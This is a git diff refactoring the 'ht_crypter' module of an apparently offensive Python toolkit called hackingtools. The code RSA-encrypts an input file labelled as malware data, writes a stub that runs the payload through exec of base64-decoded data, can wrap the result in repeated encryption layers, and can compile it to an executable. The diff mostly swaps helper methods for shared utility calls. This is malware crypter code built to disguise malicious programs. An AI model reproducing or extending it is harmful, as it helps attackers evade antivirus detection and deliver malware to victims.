@@ -1,4 +1,4 @@
-from hackingtools.core import Logger, Config
+from hackingtools.core import Logger, Config, Utils
 import hackingtools as ht 
 
 import binascii
@@ -21,18 +21,6 @@ class StartModule():
 
 	def help(self):
 		Logger.printMessage(message=ht.getFunctionsNamesFromModule('ht_crypter'))
-
-	def getMalwareData(self, fileName):
-		"""
-		Get's binary from the file given in param as fileName
-		Param fileName: path to the file
-		Return: byte array
-		"""
-		Logger.printMessage(message='{methodName}'.format(methodName='getMalwareData'), description='{fileName}'.format(fileName=fileName), debug_module=True)
-		file = open(fileName, "rb")
-		file_data = file.read()
-		file.close()
-		return file_data
 
 	def convertToExe(self, stub_name):
 		"""
@@ -66,15 +54,6 @@ class StartModule():
 		if os.path.isfile(spec_file):
 			os.remove(spec_file)
 
-	def is_valid_file(self, parser, arg):
-		"""
-		Returns the file if exists, else, print's and error
-		"""
-		if not os.path.exists(arg):
-			parser.error("The file {file} does not exist!".format(file=arg))
-		else:
-			return arg
-
 	def clean_output_dir(self):
 		"""
 		Clean's the output.
@@ -85,29 +64,13 @@ class StartModule():
 		if os.path.isdir(output_dir):
 			shutil.rmtree(output_dir)
 
-	def saveStub(self, stub, save_name, print_save_stub=True):
-		"""
-		Saves a new file with a Byte Array and a filename
-		Param stub: Byte Array
-		Param save_name: String
-		Param print_save_stub: True/False
-		This is used for saving the crypted file when crypt_file() is called
-		"""
-		stub_name = save_name
-		stub_file = open(stub_name, "w")
-		stub_file.write(stub)
-		stub_file.close()
-		if print_save_stub:
-			Logger.printMessage(message='{methodName}'.format(methodName='saveStub'), description='{filename}'.format(filename=save_name), debug_module=True)
-
-	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, is_iterating=False, is_last=False, convert=False):
+	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, is_iterating=False, is_last=False, convert=False):
 		"""
 		Create's the stub for the crypter and has some courious params he have to see:
 		Param crypto_data_hex: Byte Array
 		Param public_key: (x, y)
 		Param drop_file_name: String
 		Param save_name: String
-		Param print_save_stub: True/False
 		Param is_iterating: True/False
 		Param is_last: True/False
 		Param convert: True/False
@@ -181,12 +144,12 @@ if os.path.exists(drpnm):
 		stub += "data = {st_ba64}\n".format(st_ba64=stub_base64)
 		stub += "exec(base64.b64decode(data))"
 		
-		self.saveStub(stub, save_name, print_save_stub)
+		Utils.saveToFile(content=stub, fileName=save_name)
 
 		if convert:
 			self.convertToExe(save_name)
 
-	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', prime_length=4, print_save_stub=True, compile_exe=False, is_iterating=False, iterate_count=1, is_last=False):
+	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', prime_length=4, compile_exe=False, is_iterating=False, iterate_count=1, is_last=False):
 		"""
 		Crypt's a file when some params we have to use:
 		Param filename: is the path to the file you want to crypt.
@@ -194,7 +157,6 @@ if os.path.exists(drpnm):
 		Param drop_file_name: is the name could be used to drop a file finaly when executing crypted file. Same name could be same as new_file_name for not dropping a file.
 		Param prime_length: is for generating some RSA keys with those length of prime numbers automatically generated.
 		Param compile_exe: is for telling the crypter to compile it to exe if posible.
-		Param print_save_stub: is for get a message at log when the crypt is finished.
 		Param is_iterating: is used internally for knowing where the bucle is.
 		Param iterate_count: is used internally for knowing where the bucle is.
 		Param is_last: is used internally for knowing where the bucle is.
@@ -206,12 +168,12 @@ if os.path.exists(drpnm):
 			for i in range(1, iterate_count):
 				if i == iterate_count - 1:
 					is_last = True
-				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, print_save_stub=False, compile_exe=False, is_iterating=True, iterate_count=1, is_last=is_last)
+				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, compile_exe=False, is_iterating=True, iterate_count=1, is_last=is_last)
 		
 		filename = temp_filename
 		if filename and new_file_name:
 			crypter_rsa = ht.getModule('ht_rsa')
-			data = self.getMalwareData(filename)
+			data = Utils.getFileContentInByteArray(filePath=filename)
 			prime_a, prime_b = crypter_rsa.getRandomKeypair(prime_length)
 			public, private = crypter_rsa.generate_keypair(prime_a, prime_b)
 			crypted_data = crypter_rsa.encrypt(private_key=private, plaintext=data)
@@ -220,10 +182,10 @@ if os.path.exists(drpnm):
 				new_file = '{file}.py'.format(file=new_file)
 
 			if compile_exe:
-				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last, convert=True)
+				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, is_iterating=is_iterating, is_last=is_last, convert=True)
 				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
 			else:
-				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, print_save_stub=print_save_stub, is_iterating=is_iterating, is_last=is_last)
+				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, is_iterating=is_iterating, is_last=is_last)
 			return new_file
 		else:
 			return None
